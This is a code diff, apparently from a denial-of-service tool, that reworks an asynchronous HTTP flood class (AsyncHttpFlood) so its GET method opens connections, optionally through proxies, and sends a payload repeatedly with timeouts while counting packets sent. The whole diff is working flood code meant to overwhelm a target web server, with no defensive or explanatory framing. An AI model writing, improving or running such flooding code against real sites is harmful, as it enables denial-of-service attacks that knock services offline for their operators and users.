@@ -897,13 +897,14 @@ class HttpFlood:
         if name == "DOWNLOADER": self.SENT_FLOOD = self.DOWNLOADER
 
 
+# XXX: there's literally no need for this class to exist
 class AsyncHttpFlood(HttpFlood):
 
     async def run(self) -> int:
         return await self.SENT_FLOOD()
 
-    # XXX: socket flags
-    # XXX: timeout
+    # XXX: timeout as it was before sock.settimeout(SOCK_TIMEOUT)
+    # note that TCP_NODELAY is set by default since Python3.6+
     async def open_connection(self) -> socket:
         is_tls = self._target.scheme.lower() == "https" or self._target.port == 443
         if self._proxies:
@@ -920,28 +921,18 @@ class AsyncHttpFlood(HttpFlood):
                 host=self._target.host, port=self._target.port, ssl=is_tls) 
         return reader, writer
 
-        sock.setsockopt(IPPROTO_TCP, TCP_NODELAY, 1)
-        sock.settimeout(SOCK_TIMEOUT)
-        sock.connect(self._raw_target)
-
-        return sock
 
     async def GET(self) -> int:
         payload: bytes = self.generate_payload()
-        writer, packets = None, 0
-        try:
-            reader, writer = await self.open_connection()
-            for _ in range(self._rpc):
-                writer.write(payload)
-                await writer.drain()
-                self._stats.track(1, len(payload))
-                packets += 1
-        except Exception as e:
-            pass
-            #print(e)
-        if writer:
-            writer.close()
-            await writer.wait_closed()
+        packets: int = 0
+        reader, writer = await asyncio.wait_for(self.open_connection(), timeout=8)
+        for _ in range(self._rpc):
+            writer.write(payload)
+            await asyncio.wait_for(writer.drain(), timeout=1)
+            self._stats.track(1, len(payload))
+            packets += 1
+        writer.close()
+        await asyncio.wait_for(writer.wait_closed(), timeout=1)
         return packets
 
 
